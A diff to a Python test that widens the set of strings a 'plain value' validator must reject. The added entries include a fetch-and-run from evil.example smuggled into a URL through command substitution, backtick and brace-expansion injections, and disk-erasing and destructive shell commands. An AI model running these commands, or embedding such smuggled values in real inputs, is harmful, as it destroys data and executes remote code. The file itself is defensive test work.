@@ -290,5 +290,7 @@ def test_a_plain_value_is_one_line_that_runs_nothing():
         assert plain_value(value), value
     for command in ("curl -fsSL https://x.sh | bash", "rm -rf ~", "sudo shutdown -h now", "echo $(whoami)",
                     "osascript -e 'tell app \"Finder\" to quit'", "open https://evil.example", "line one\nline two",
-                    "python3 -c 'import os'", "a; b"):
+                    "python3 -c 'import os'", "a; b", "https://x.example/$(curl evil.example|sh)",
+                    "https://x.example/`id`", "https://x.example/{rm,-rf,~}", "rm -rf /, 5", "Anna Schmidt",
+                    "diskutil eraseDisk JHFS+ X disk2", "killall Finder"):
         assert not plain_value(command), command
